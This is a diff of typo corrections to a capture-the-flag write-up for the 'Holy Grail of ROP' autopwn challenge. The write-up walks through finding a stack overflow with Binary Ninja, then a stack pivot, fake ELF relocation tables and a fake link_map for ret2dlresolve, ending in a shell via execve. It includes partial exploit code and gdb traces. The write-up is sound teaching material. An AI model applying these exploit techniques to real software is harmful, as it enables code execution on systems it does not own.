@@ -6,7 +6,7 @@
 Given: `ctf.battelle.org 30042`
 
 
-Full disclaimer I didn't solve it as I gave up too early due to a stupid mistake. Holy Grail of ROP was my first autopwn challenge and I loved it. Being my first autopwn their are many things that I could have done better so be sure to check out these writeups to see a better alternative.
+Full disclaimer I didn't solve it as I gave up too early due to a stupid mistake. Holy Grail of ROP was my first autopwn challenge and I loved it. Being my first autopwn there are many things that I could have done better so be sure to check out these writeups to see a better alternative.
 
 https://debugmen.dev/ctf-writeup/2022/01/14/holygrail.html
 
@@ -16,7 +16,7 @@ Parse binary with Binja to find vuln-> Stack Pivot-> Place fake link map-> Ret2d
 
 <h2>Stage 1: Parsing</h2>
 
-Unlike the classical pwn challenge their is no binary provided. Connecting to the service it seems to give us a new binary each time. First things first dump the binary locally so other tools can access it. One important thing to note is to give it a random name, this way you can spam connections and not have namespace collisions.
+Unlike the classical pwn challenge, their is no binary provided. Connecting to the service seems to give us a new binary each time. First things first dump the binary locally so other tools can access it. One important thing to note is to give it a random name, this way you can spam connections and not have namespace collisions.
 
 ```python
 from pwn import *
@@ -47,8 +47,8 @@ Checksec shows no protections except NX.
     PIE:      No PIE (0x8048000)
 ```
 
-The main function seems to call 2 functions. The first ones just a call to setvbuf to disable buffering, a common CTF thing so nothing to worry about.
-The second one will read in user input and then compare it to a string in the data section. Depending on the output it will call other functions that are simulariy shaped.
+The main function seems to call 2 functions. The first one just calls setvbuf to disable buffering, a common CTF thing so nothing to worry about.
+The second one will read in user input and then compare it to a string in the data section. Depending on the output it will call other functions that are similarly shaped.
 ```
 int32_t sub_8048579()
 {
@@ -67,7 +67,7 @@ int32_t sub_8048579()
     return eax_4;
 }
 ```
-After a couple of calls their a "end" function that reads in data and does a final strcmp.
+After a couple of calls their an "end" function that reads in data and does a final strncmp.
 ```
 int32_t sub_8048ae0()
 {
@@ -79,7 +79,7 @@ int32_t sub_8048ae0()
 }
 ```
 
-At this point I didn't want to look through these functions but I assumed that at least one of these should have a buffer overflow. I noticed that their was a call to memset on the buffer on the stack so if the read size was larger than that memset then that functin should be vuln. Just bought Binary Ninja recenlty and decided to give it a try. I search through all the functions that returned `int32_t` and then checked the params of memset and read. Indeed their is a vuln function. 
+At this point, I didn't want to look through these functions but I assumed that at least one of these should have a buffer overflow. I noticed that there was a call to memset on the buffer on the stack so if the read size was larger than that memset then that function should be vuln. Just bought Binary Ninja recently and decided to give it a try. I search through all the functions that returned `int32_t` and then checked the params of memset and read. Indeed there is a vuln function. 
 
 ```python
 import binaryninja
@@ -118,7 +118,7 @@ int32_t sub_804897b{()
 }
 ```
 
-With the address of the vuln function we just need to find a function that calls it. Luckily Binary Ninja has a callee functin so we can just climb those until we hit main.
+With the address of the vuln function we just need to find a function that calls it. Luckily Binary Ninja has a callee function so we can just climb those until we hit main.
 
 ```python 
 func_list = []
@@ -127,7 +127,7 @@ while vuln.callers:
     vuln = vuln.callers[0]
 ```
 
-Now that we have a path to a vuln function we just need to pass or fail the strcmp's to get a buffer overflow. The paramter to the strcmp is a pointer to a pointer so using read we can get the string in the binary. The code for this part if really ugly so be sure to check out the other writeups. We can also grab the buffer size by checking the stack size
+Now that we have a path to a vuln function we just need to pass or fail the strncmp's to get a buffer overflow. The parameter to the strncmp is a pointer to a pointer so using read we can get the string in the binary. The code for this part is really ugly so be sure to check out the other writeups. We can also grab the buffer size by checking the stack size
 ```python 
 func_list = func_list[::-1][1:]
 
@@ -188,7 +188,7 @@ gef➤  x $eip
 0x41414141:     Cannot access memory at address 0x41414141
 ```
 
-Heres was when the fun stuff started to happen. For the longest time I assume it was just a simple ROP challenge but the gadgets in the binary were really bad. Their was a couple of gadgets that could be used to stack pivot but nothing to pop registers for a syscall and the GOT had no functions to leak. At this point I realized that the so called holy grail of ROP must be dl_resolve. We can call read@plt and the lack of PIE allows us to read into bss or data section. First I did a stack piviot to read more data and setup for the dl_resolve.
+Here was when the fun stuff started to happen. For the longest time I assumed it was just a simple ROP challenge but the gadgets in the binary were really bad. There were a couple of gadgets that could be used to stack pivot but nothing to pop registers for a syscall and the GOT had no functions to leak. At this point, I realized that the so-called holy grail of ROP must be dl_resolve. We can call read@plt and the lack of PIE allows us to read into bss or data section. First I did a stack pivot to read more data and setup for the dl_resolve.
 
 ```python 
 fake_stack = exe.bss() + 0xa00
@@ -208,13 +208,13 @@ payload = flat([
 p.send(payload)
 ```
 
-In this writeup I will discus all my failed attempts as well because they show how much their is to Ret2dlResolve. 
+In this writeup, I will discuss all my failed attempts as well because they show how much there is to Ret2dlResolve. 
 
 <h2>Attempt 1: Ret2dlResolve</h2>
 
-This exploit is what I think of when I heard ret2dlResolve and it involves construction a bunch of fake tables. 
+This exploit is what I think of when I heard ret2dlResolve and it involves construction of a bunch of fake tables. 
 
-When a functin is called for the first time and lazy loading is used(partial-Relo) the plt function will jump to the address in the GOT. When the GOT is first initilzed it holds points back into the plt which will call dl_resolve. 
+When a function is called for the first time and lazy loading is used(partial-Relo) the plt function will jump to the address in the GOT. When the GOT is first created it holds points back into the plt which will call dl_resolve. 
 ``` 
 gef➤  x/4i 134513552
    0x8048390 <read@plt>:        jmp    DWORD PTR ds:0x804b00c     # CALLS GOT
@@ -246,7 +246,7 @@ gef➤  x/10i 0xf7fd8fe0
    0xf7fd8ff8 <_dl_runtime_resolve+24>: mov    DWORD PTR [esp],eax
 ```
 
-For dl_resolve their are 2 main structs and three sections that we need to know about
+For dl_resolve there are 2 main structs and three sections that we need to know about
 ``` 
 gef➤  ptype Elf32_Rel
 type = struct {
@@ -297,7 +297,7 @@ Dynamic section at offset 0x1f10 contains 24 entries:
 
 The first value that is pushed is the functions offset in the jmprel.
 
-The jmprel hold a bunch of Elf32_Rel's
+The jmprel holds a bunch of Elf32_Rel's
 ```c
 gef➤  p *(Elf32_Rel[6]*)0x8048320
 $6 = {{
@@ -324,9 +324,9 @@ gef➤
 
 R_offset is the GOT address of the function, this tells dl_resolve where to write the pointers once they are resolved. 
 
-R_Info is divided into 2 more fields, R_TYPE and R_SYM. The last two bytes is R_TYPE and is always 7 for GOT entries. R_SYM is a values offset in the SYMTAB.
+R_Info is divided into 2 more fields, R_TYPE and R_SYM. The last two bytes is R_TYPE, its always 7 for GOT entries. R_SYM is a value offset in the SYMTAB.
 
-The SYMTAB hold a bunch of ELF32_Sym
+The SYMTAB holds a bunch of ELF32_Sym
 ```c
 gef➤  p *(Elf32_Sym[6]*)0x80481cc
 $3 = {{
@@ -374,9 +374,9 @@ $3 = {{
   }}
 ```
 
-Their are a couple of fields here but the main ones that we are interested in is st_name. Its the offset into the STRTAB.
+There are a couple of fields here but the main one that we are interested in is st_name. Its the offset into the STRTAB.
 
-The STRTAB is not a struct but rather bunch of strings that are function names
+The STRTAB is not a struct but rather a bunch of strings that are function names
 ```
 gef➤  x/13s 0x804826c
 0x804826c:      ""
@@ -394,7 +394,7 @@ gef➤  x/13s 0x804826c
 0x80482db:      ""
 ```
 
-So heres my TL;Dr on how to call dl_resolve_runtime
+So here's my TL;Dr on how to call dl_resolve_runtime
 ```
 push jmp_offset 
 dl_runtime_resolve()
@@ -412,7 +412,7 @@ _dl_lookup_symbol_x(name)
 
 So when we call dl_resolve we just need to push the jmp_offset and construct a fake symtab, jmptab and strtab. One thing to note is that the SYMTAB Offet must be aligned, just place the structures and check in gdb.
 
-In my this exploit the fake_table is created in the BSS and far from our fake stack to avoid collisions. In later exploits this changes to minmize reads. 
+In this exploit the fake_table is created in the BSS and far from our fake stack to avoid collisions. In later exploits this changes to minimize reads. 
 ```python 
 fake_table = exe.bss() + 0x23c 
 
@@ -439,7 +439,7 @@ fake_str = b"execve\x00\x00/bin/bash"
 fake = fake_jmp + fake_sym + fake_str
 ```
 
-Heres what out fake structs look like in memory (I replaced the addresses with the names of symbols)
+Here's what out fake structs look like in memory (I replaced the addresses with the names of symbols)
 ``` 
 $eax   : 0x29
 $ebx   : 0x0
@@ -496,7 +496,7 @@ gef➤  x/s STRTAB + 0x3050
 0x804b2bc:      "execve"
 ```
 
-At this point I thought it was done but it kept segfaulting for some reason. 
+At this point, I thought it was done but it kept segfaulting for some reason. 
 ```gdb 
 $eax   : 0x0804b95c  →   or BYTE PTR [edi], dh
 $ebx   : 0x0
@@ -564,7 +564,7 @@ gef➤  x/40i 0xf7fc4f20
 => 0xf7fc4f3a <_dl_fixup+170>:  mov    ebx,DWORD PTR [edx+0x4]   <======= SEG HERE
 ```
 
-More GDB shows that sometimes the random value would be null, in this case the mov would be sucessful as 0 shifted it still 0.
+More GDB shows that sometimes the random value would be null, in this case, the mov would be sucessful as 0 shifted it still 0.
 ```gdb 
 $eax   : 0x0804b27c  →  0x00003020 (" 0"?)
 $ebx   : 0x0
@@ -679,12 +679,12 @@ gef➤  x/10wx $ecx
 0x8048918:      0x000026ea      0xe031838d
 ```
 
-After a lot of shifting the fake tables we finally get a local shell!
+After a lot of shifting the fake tables, we finally get a local shell!
 Things to note:
     - Make sure to sleep and set context.log_level to debug to make sure you don't have buffering issues
     - Sometimes it would resolve but the index was in something vital and would result in a segfault after the symbol lookup, just try more offsets, 0's are always the best
 
-Heres when my nightmare start, it seems that the addresses of those nulls are very random across the binaries. 
+Here's when my nightmare started, it seems that the addresses of those nulls are very random across the binaries. 
 ```gdb 
 gef➤  x/10wx 0x80488f0
 0x80488f0:      0x75c08510      0x02cee807      0x05eb0000      0x00033be8
@@ -699,8 +699,8 @@ gef➤  x/10wx 0x80488f0
 ```
 
 
-On top of that this section is part of the ld, so my local one may not be the same as remote. 
-Originally I was hoping that I could find a section that only had nulls as these pages usually are not all used so the end should be all null. The issue here is that our range is the BSS's range so its somewhere between 448.
+On top of that, this section is part of the ld, so my local one may not be the same as the remote. 
+Originally I was hoping that I could find a section that only had nulls as these pages usually are not all used so the end should be all null. The issue here is that our range is the BSS's range so it's somewhere between 448.
 ```gdb 
 gef➤  x/112wx $ecx
 0x80488b2:      0x04ec8310      0x458d136a      0x006a50dd      0xfffacde8
@@ -733,7 +733,7 @@ gef➤  x/112wx $ecx
 0x8048a62:      0xc3c9fc5d      0x53e58955      0x0084ec81      0xdbe80000
 ```
 
-After a lot of fiddling I realized that this attempt for remote would never work so I moved into my next attempt idea. After research for my next methods I came across this article that explain this issue. Turns out this was a hash map index but the author used a the same solution as mine.
+After a lot of fiddling, I realized that this attempt for remote would never work so I moved on my next attempt idea. After researching for my next methods, I came across this article that explains this issue. Turns out this was a hash map index but the author used the same solution as mine.
 <https://ctf--wiki-org.translate.goog/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US#partial-relro_1>(Hand Forged Stage 4)
 
 After solving this challenge I also saw this writeup that used this method and figured out how to fix this error
@@ -742,7 +742,7 @@ After solving this challenge I also saw this writeup that used this method and f
 <h2>Attempt 2 Fake STRTAB with Link Map</h2>
 This exploit attempt was a major failure but also paves the way for the final exploit method. Before DL_Resolve is called it pushes a value onto the stack. 
 
-This value is acuatlly the link map. It hold information that dl_resolve will use when running such as the address of symtab, strtab and jmprel. The struct is humongus but the here are the ones that we care about.
+This value is actually the link map. It holds information that dl_resolve will use when running such as the address of symtab, strtab and jmprel. The struct is humongous but here are the ones that we care about.
 ```gdb 
 pwndbg> dt link_map 0xf7fc2a40
 link_map @ 0xf7fc2a40
@@ -750,7 +750,7 @@ link_map @ 0xf7fc2a40
     +0x0020 l_info               : {0x0, 0x804af10, 0x804af80, 0x804af78, 0x0, 0x804af50, 0x804af58, 0x0, 0x0, 0x0, 0x804af60, 0x804af68, 0x804af18, 0x804af20, 0x0, 0x0, 0x0, 0x804af98, 0x804afa0, 0x804afa8, 0x804af88, 0x804af70, 0x0, 0x804af90, 0x0, 0x804af28, 0x804af38, 0x804af30, 0x804af40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x804afb8, 0x804afb0, 0x0 <repeats 13 times>, 0x804afc0, 0x0 <repeats 25 times>, 0x804af48}
 ```
 
-L_Info is a giant array of address and they can be looked up here. Most important ones inclue DT_STRTAB, DT_SYMTAB and DT_REL. <https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-42444/index.html>
+L_Info is a giant array of addresses and they can be looked up here. Most important ones include DT_STRTAB, DT_SYMTAB and DT_JMPREL. <https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-42444/index.html>
 
 `
 DT_STRTAB 5
@@ -758,10 +758,10 @@ DT_SYMTAB 6
 DT_JMPREL 23
 `
 
-Originally I wanted create a fake strtab that would just point to execve. Hence I could just call the plt stub for read or something and it would resolve to execve or system.
+Originally I wanted to create a fake strtab that would just point to execve. Hence I could just call the plt stub for read or something and it would resolve to execve or system.
 It would involve reading in the fake link_map and calling the dl_resolve stub later. 
 
-Could not found my POC from this but I never got this method working. In `_dl_resolve` their are two main codepaths, the top ones the normal one that we usally call. However this top path needs more values from link map as theirs obviously more code. The issue is that link_map is huge and requires too many values that would require leaking to fake or well calculated fkae values. The whole point of using this was to avoid constructing jmptab and symtab but now those seem easier. I manged to figure out a handful of the values by setting memory breakpoints and then rewinding to program to see where they were set. Evenatually this got tiring and I decided to move onto exploit attempt 3.
+Could not find my POC from this but I never got this method working. In `_dl_resolve` there are two main code paths, the top ones the normal one that we usually call. However, this top path needs more values from the link map as theirs obviously more code. The issue is that link_map is huge and requires too many values that would require leaking to fake or well-calculated fake values. The whole point of using this was to avoid constructing jmptab and symtab but now those seem easier. I managed to figure out a handful of the values by setting memory breakpoints and then rewinding the program to see where they were set. Eventually, this got tiring and I decided to move on to exploit attempt 3.
 
 ```c 
   if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
@@ -814,7 +814,7 @@ Could not found my POC from this but I never got this method working. In `_dl_re
 
 <h2>Attempt 3 Fake Link Map</h2>
 
-Remember that second code path in dl_resolve? Its extremely simple and only calls a single function DL_FIXUP_MAKE_VALUE. This means that less values in link map will be used so we will only need to fake the important ones
+Remember that second code path in dl_resolve? It's extremely simple and only calls a single function DL_FIXUP_MAKE_VALUE. This means that fewer values in the link map will be used so we will only need to fake the important ones
 
 ```c 
 (((refsym) == ((void*)0) ? 0 : (__builtin_expect (((refsym)->st_shndx == 0xfff1), 0) ? 0 : ((1) || (l) ? (l)->l_addr : 0)) + (refsym)->st_value))
@@ -823,11 +823,11 @@ Remember that second code path in dl_resolve? Its extremely simple and only call
 After cleaning up the checks the return value is basically `link_map->l_addr + refsym->st_value`
 We have full control of link_map and refsym so we can use this second case to resolve execve. 
 
-If we manage to set st_value to a libc address then we can brute force libc offets using l_addr. 
+If we manage to set st_value to a libc address then we can brute force libc offsets using l_addr. 
 
-We can set the fake symtab to point to the GOT entry of __libc_start_main and l_addr to `execve - __libc_start_main's address`. Hence when they are added it should return the address of execve. This means that we do not need to setup a STRTAB or SYMTAB, we just need a jmprel
+We can set the fake symtab to point to the GOT entry of __libc_start_main and l_addr to `execve - __libc_start_main's address`. Hence when they are added it should return the address of execve. This means that we do not need to set up a STRTAB or SYMTAB, we just need a jmprel
 
-One thing to note about the link map's l_info array, it does not point to the symtab or jmprel but rather a pointer to a struct that contains a pointer as well as its identifyer.
+One thing to note about the link map's l_info array, it does not point to the symtab or jmprel but rather a pointer to a struct that contains a pointer as well as its identifier.
 
 ```gdb 
 gef➤  x/2wx (*(link_map*)0x0804bb70).l_info[23]
@@ -850,7 +850,7 @@ $2 = {
 }
 ```
 
-This means that in our link map we only need a l_addr, and l_info with strtab, symtab and jmprel pointers. Outside of the link map we need to constuct the jmprel structure as well as the extra structs to point to our tables. 
+This means that in our link map we only need a l_addr, and l_info with strtab, symtab and jmprel pointers. Outside of the link map we need to construct the jmprel structure as well as the extra structs to point to our tables. 
 
 ```python 
 def make_link_map(fake_addr, offset_2_addr):
@@ -901,9 +901,9 @@ fake += fake_jmprel
 fake += b"/bin/bash"
 ```
 
-One thing to note is that in them jmprel r_offset seems to be a funny value. The reason being that this address plus the offset is written to with the resolved address shortly before dl_resolve_runtime finishes. I figured this out by setting memory watchpoints 
+One thing to note is that in them jmprel r_offset seems to be a funny value. The reason is that this address plus the offset is written to with the resolved address shortly before dl_resolve_runtime finishes. I figured this out by setting memory watchpoints 
 
-In this example I set r_offset to 0, notice that value is in edi is the offset of the two values
+In this example I set r_offset to 0, notice that the value in edi is the offset of the two values
 ```gdb 
 $eax   : 0xf7e4e790  →  <execve+0> endbr32
 $ebx   : 0xf7ffa000  →  0x00036f2c
@@ -950,16 +950,17 @@ After setting up all this magic we finally get a local shell!!
 
 
 <Phase 2: Remote>
-Getting everything working remote was the part which I gave up on. Locally I had a bunch of helper functions to send the inputs in but on remote I never did that, hence I was never even hitting the buffer overflow. I assumed it was a buffering issue so tried a combination of send vs sendlines vs sleeping. I ever wrote how the link_map was read in to avoid a second read. After giving up and seeing how other writeups did it I realized that I never sent the answers to the questions.
+Getting everything working remote was the part that I gave up on. Locally I had a bunch of helper functions to send the inputs in but on remote, I never called them, hence I was never even hitting the buffer overflow. I assumed it was a buffering issue so tried a combination of send vs sendlines vs sleeping. I ever re-wrote how the link_map was read in to avoid a second read. After giving up and seeing how other exploits did it I realized that I never even sent the answers to the questions.
 
-Once I figured this out I found out that my exploit was perfeclty fine. Since the remote libc may be different from my local version I needed to find a GOT entry close to execve OR figure out a way to get leaks. I went with the latter. I noticed that setvbuf and puts were only 1800 off from each other. Hence I decided to just brute force this. After running for a long time I went well past this range and decided to test locally. Locally calling puts after the exploit does NOT write anything to stdout. I spent a lot of time debugging this but it seems that after stack piviot calling puts will not error but also not write anything. At this point I was really bumed out as the rest of the GOT functions were really far from puts. Then I realized that read and write were right besides each other so using write would solve all my problems.
-After a bit of bruteforcing I found that write was 160 bytes after read, using this we can now do a ret2libc if we leak the GOT. Leaking the GOT libc6-i386_2.28-10_amd64. With this we can find the exact offset from execve and `__libc_start_main` and pop a shell!
+Once I figured this out I found out that my exploit was perfectly fine. Since the remote libc may be different from my local version I needed to find a GOT entry close to execve OR figure out a way to get leaks. I went with the latter. I noticed that setvbuf and puts were only 1800 off from each other. Hence I decided to just brute force this. After running for a long time I went well past this range and decided to test locally. Locally calling puts after the exploit does NOT write anything to stdout. I spent a lot of time debugging this but it seems that after stack pivot calling puts will not error but also not write anything. At this point, I was bummed out as the rest of the GOT functions were really far from puts. Then I realized that read and write were right besides each other so using write would solve all my problems.
+After a bit of bruteforcing I found that write was 160 bytes after read, using this we can now do a ret2libc if we leak the GOT. Leaking the GOT libc6-i386_2.28-10_amd64. 
 
 ![image](https://user-images.githubusercontent.com/77011982/183148422-69b47c67-314e-4782-8468-e2deaa4f84cc.png)
 
-
+With this, we can find the exact offset from execve and `__libc_start_main` and pop a shell!
 
 After getting a shell we will notice that theirs a hint.txt, for some reason I could not cat this file but using base64 I could read it.
+
 ```
 Congrats! You we're supposed to find this!
 
@@ -970,7 +971,7 @@ Your binary was invoked like this
 LD_PRELOAD=/lib32/libgrail.so ./bin
 ```
 
-Grabbing the ld file and looking through the functions we see the holy grail. We could either call this function my leaking ld but I really like this leakless exploit. We can just get a shell and then do `echo DONE>./log; exit` to fake this functin.
+Grabbing the ld file and looking through the functions we see the holy grail. We could either call this function my leaking ld but I want to keep this a leakless exploit. We can just get a shell and then do `echo DONE>./log; exit` to fake this function.
 
 ``` 
 int32_t holy_grail() __noreturn
@@ -984,7 +985,7 @@ int32_t holy_grail() __noreturn
 }
 ```
 
-Once we do this we get another binary and we just need to sinse and repeat. One thing to note is that this takes forever, it needs to exploit the binary 5 times and the processes dies a lot. But after a lot of tmux spamming I finally got the flag
+Once we do this we get another binary and we just need to rinse and repeat. One thing to note is that this takes forever, it needs to exploit the binary 5 times and the process dies a lot. But after a lot of tmux spamming, I finally got the flag
 
 
 ![image](https://user-images.githubusercontent.com/77011982/183148462-bc435b40-ccde-4819-9921-8b83f33cdd5f.png)
